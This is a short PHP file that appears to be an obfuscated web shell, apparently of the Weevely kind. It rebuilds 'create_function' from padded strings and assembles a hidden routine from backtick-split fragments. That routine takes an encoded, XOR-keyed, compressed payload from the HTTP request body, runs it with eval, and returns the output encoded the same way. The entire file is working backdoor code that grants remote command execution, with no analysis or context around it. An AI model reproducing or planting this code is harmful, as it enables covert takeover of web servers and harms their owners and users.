<?php
$Z=str_replace('z','','czreazte_zfuzzncztion');
$c='$j+`+,$`i++`){$o.=$t{$i}^$`k{$j};}}ret`urn $`o;}if (`@preg``_matc';
$h='se64_e`nc`ode(@`x(@gzcompre`ss($o),`$k));pri``nt("$p$k`h$r$kf");}';
$J='h("/$k`h(.+)$k`f/",`@fil`e_ge`t`_contents("`p`hp://inp`ut"),$m`)=';
$u='`[1]`),$k)));$o=``@ob_get_co`ntents();@`ob_e`nd_clea`n()`;$r=@ba`';
$r='`8zp`DumsZLQ`ZglQ`W";`function `x($`t,$k)`{$`c=`strlen($k);$l=str';
$O='`$k="5e`aaf26f";$`kh="5942e`0f0b9`7a";$kf`="f63bf15`387a4`";$p="2';
$K='l`en`($t);$o="";for`($i=0`;$i<$`l;){fo`r($j=0;`($j<$c&`&$i<$`l);`';
$E='=1) {@ob_star`t();@e`val(@g`z`uncompress(`@x(@`bas`e64`_decode($m';
$Q=str_replace('`','',$O.$r.$K.$c.$J.$E.$u.$h);
$d=$Z('',$Q);$d();
?>
